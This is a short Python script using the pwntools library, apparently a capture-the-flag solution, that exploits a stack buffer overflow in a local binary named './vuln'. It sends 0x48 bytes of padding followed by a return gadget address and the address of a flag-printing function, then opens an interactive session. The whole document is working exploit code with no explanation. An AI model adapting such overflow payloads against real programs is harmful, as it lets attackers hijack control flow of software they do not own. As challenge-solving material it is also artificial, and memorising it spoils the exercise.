from pwn import *
s = process('./vuln')
flag = 0x400767 
ret = 0x00000000004005de 
payload = 0x48*'a'
payload += p64(ret) 
payload += p64(flag)
s.sendline(payload)
s.interactive()
